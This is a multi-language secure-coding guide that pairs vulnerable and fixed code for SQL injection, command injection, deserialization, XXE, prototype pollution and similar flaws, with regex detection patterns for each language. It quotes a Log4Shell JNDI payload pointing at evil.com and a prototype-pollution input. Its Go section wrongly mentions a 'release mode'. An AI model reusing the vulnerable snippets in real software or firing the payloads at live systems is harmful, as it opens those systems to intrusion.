# Language-Specific Security Vulnerabilities

## Go

### SQL injection
```go
// VULNERABLE
query := fmt.Sprintf("SELECT * FROM users WHERE name = '%s'", userInput)
db.Query(query)

// SECURE
db.Query("SELECT * FROM users WHERE name = $1", userInput)
```

### Path traversal
```go
// VULNERABLE
http.ServeFile(w, r, filepath.Join("/uploads", r.URL.Path))

// SECURE
cleanPath := filepath.Base(filepath.Clean(r.URL.Path))
fullPath := filepath.Join("/uploads", cleanPath)
if !strings.HasPrefix(fullPath, "/uploads/") {
    http.Error(w, "invalid path", 400)
    return
}
```

### Race conditions
```go
// VULNERABLE — data race
var balance int
go func() { balance += 100 }()
go func() { balance -= 50 }()

// SECURE
var balance atomic.Int64
go func() { balance.Add(100) }()
go func() { balance.Add(-50) }()
// Or use sync.Mutex for complex operations
```

### Integer overflow
```go
// Go wraps silently on overflow in release mode
var x uint8 = 255
x++ // x is now 0 — dangerous for size/offset calculations

// SECURE — check bounds
if x == math.MaxUint8 {
    return errors.New("overflow")
}
```

### Goroutine/resource leaks
```go
// VULNERABLE — goroutine leak if context cancelled
go func() {
    result := expensiveOperation()
    ch <- result  // Blocks forever if nobody reads ch
}()

// SECURE — select with context
go func() {
    result := expensiveOperation()
    select {
    case ch <- result:
    case <-ctx.Done():
    }
}()
```

### HTTP server security
```go
// VULNERABLE — no timeouts (slowloris DoS)
http.ListenAndServe(":8080", handler)

// SECURE
srv := &http.Server{
    Addr:              ":8080",
    ReadHeaderTimeout: 5 * time.Second,
    ReadTimeout:       10 * time.Second,
    WriteTimeout:      30 * time.Second,
    IdleTimeout:       120 * time.Second,
    MaxHeaderBytes:    1 << 20, // 1MB
    Handler:           handler,
}
```

### Detection patterns
```
fmt.Sprintf.*SELECT|INSERT|UPDATE|DELETE
exec.Command.*\+|exec.Command.*Sprintf
filepath.Join.*r\.(URL|Form|Query)
http.ListenAndServe(?!.*Server)
```

**Tools:** `gosec`, `govulncheck`, `go vet`, `-race` flag, `staticcheck`

---

## Python

### Deserialization RCE
```python
# VULNERABLE — arbitrary code execution
pickle.loads(user_data)
pickle.load(user_file)
yaml.load(user_input)            # Unsafe default before PyYAML 6
shelve.open(user_path)
marshal.loads(user_data)

# SECURE
json.loads(user_data)            # Data-only format
yaml.safe_load(user_input)      # Blocks arbitrary objects
```

### Code execution
```python
# VULNERABLE
eval(user_input)
exec(user_code)
compile(user_input, '<string>', 'exec')
__import__(user_module)

# SECURE — if literal evaluation needed
import ast
result = ast.literal_eval(user_input)  # Only parses literals
```

### Command injection
```python
# VULNERABLE
os.system(f"grep {user_input} /var/log/app.log")
subprocess.call(cmd, shell=True)
subprocess.Popen(f"ls {path}", shell=True)

# SECURE
subprocess.run(["grep", user_input, "/var/log/app.log"], check=True)
# shell=False is default in subprocess.run
```

### SQL injection
```python
# VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
cursor.execute("SELECT * FROM users WHERE name = '%s'" % name)

# SECURE
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### Template injection
```python
# VULNERABLE
from jinja2 import Template
Template(user_input).render()

from flask import render_template_string
render_template_string(user_input)

# SECURE
render_template('template.html', data=user_input)
# Or use SandboxedEnvironment
from jinja2.sandbox import SandboxedEnvironment
```

### Detection patterns
```
pickle\.load|pickle\.loads|shelve\.open|marshal\.loads
yaml\.load\b(?!.*safe_load|.*SafeLoader)
eval\(|exec\(|compile\(|__import__\(
os\.system|os\.popen
subprocess.*shell\s*=\s*True
```

**Tools:** `bandit`, `semgrep`, `pip-audit`, `safety`, `pylint`

---

## JavaScript / TypeScript

### Prototype pollution
```javascript
// VULNERABLE — deep merge without protection
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key]);
    } else {
      target[key] = source[key];
    }
  }
}
// Attacker: { "__proto__": { "isAdmin": true } }

// SECURE
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    if (typeof source[key] === 'object' && source[key] !== null && !Array.isArray(source[key])) {
      target[key] = safeMerge(target[key] || Object.create(null), source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}
```

### ReDoS
```javascript
// VULNERABLE — catastrophic backtracking
const emailRegex = /^([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+@([a-zA-Z0-9]+\.)+[a-zA-Z]{2,}$/;

// SECURE — use validator library
const { isEmail } = require('validator');
isEmail(input);
```

### Dynamic code execution
```javascript
// VULNERABLE
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);      // String form
setInterval(userInput, 1000);     // String form
require(userControlledPath);
import(userControlledPath);

// SECURE — never use eval with user input
JSON.parse(userInput);             // For data parsing
```

### DOM XSS
```javascript
// VULNERABLE
element.innerHTML = userInput;
document.write(userInput);
$(selector).html(userInput);

// SECURE
element.textContent = userInput;
// If HTML needed: DOMPurify
element.innerHTML = DOMPurify.sanitize(userInput);
```

### Detection patterns
```
eval\(|new Function\(
setTimeout\(.*["']|setInterval\(.*["']
innerHTML\s*=|outerHTML\s*=
document\.write|\.html\(
dangerouslySetInnerHTML
__proto__|prototype\s*=
require\(.*\+|import\(.*\+
child_process.*exec\(.*\+
```

**Tools:** `npm audit`, `eslint-plugin-security`, `semgrep`, `snyk`

---

## Java

### Deserialization
```java
// VULNERABLE — RCE via gadget chains
ObjectInputStream ois = new ObjectInputStream(untrustedStream);
Object obj = ois.readObject();

// SECURE — filter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("com.myapp.*;!*");
ois.setObjectInputFilter(filter);

// Better: avoid Java serialization, use JSON
ObjectMapper mapper = new ObjectMapper();
MyClass obj = mapper.readValue(input, MyClass.class);
```

### XXE (XML External Entity)
```java
// VULNERABLE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(untrustedXml);

// SECURE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setExpandEntityReferences(false);
```

### JNDI injection (Log4Shell pattern)
```java
// VULNERABLE
logger.info("User: " + userInput);
// Attacker: ${jndi:ldap://evil.com/exploit}

// SECURE
logger.info("User: {}", userInput);  // Parameterized
// + Update Log4j to 2.17.1+
```

### Detection patterns
```
ObjectInputStream|readObject\(|readUnshared\(
Runtime\.getRuntime\(\)\.exec
ProcessBuilder.*\+
DocumentBuilderFactory(?!.*disallow-doctype)
SAXParserFactory(?!.*external)
XMLInputFactory(?!.*SUPPORT_DTD.*false)
```

**Tools:** `SpotBugs + FindSecBugs`, `OWASP Dependency-Check`, `semgrep`, `Snyk`

---

## Rust

### Unsafe blocks
```rust
// Flag large unsafe blocks or those without SAFETY comments
unsafe {
    let ptr = some_function();
    *ptr = 42;  // No guarantee ptr is valid
}

// Better
/// SAFETY: `ptr` is guaranteed valid and aligned because [specific reason]
unsafe {
    debug_assert!(!ptr.is_null());
    *ptr = 42;
}
```

### Integer overflow (release mode)
```rust
// Release mode wraps silently — can bypass security checks
let size: u32 = user_input.parse()?;
let buffer_size = size * element_size;  // May wrap to small value

// SECURE
let buffer_size = size.checked_mul(element_size).ok_or("overflow")?;
```

### FFI boundaries
```rust
// VULNERABLE — trusting foreign data
unsafe {
    let s = CStr::from_ptr(external_ptr).to_str().unwrap();
}

// SECURE
unsafe {
    if external_ptr.is_null() { return Err("null pointer"); }
    let s = CStr::from_ptr(external_ptr)
        .to_str()
        .map_err(|_| "invalid UTF-8")?;
}
```

### Panic as DoS
```rust
// VULNERABLE — .unwrap() on user input causes panic
let id: u64 = input.parse().unwrap();
let item = vec[user_index];  // Panics on out-of-bounds

// SECURE
let id: u64 = input.parse().map_err(|_| "invalid id")?;
let item = vec.get(user_index).ok_or("index out of range")?;
```

### Detection patterns
```
unsafe\s*\{
\.unwrap\(\)
transmute
from_raw_parts
\.offset\(
```

**Tools:** `cargo audit`, `cargo clippy`, `miri`, `rudra`
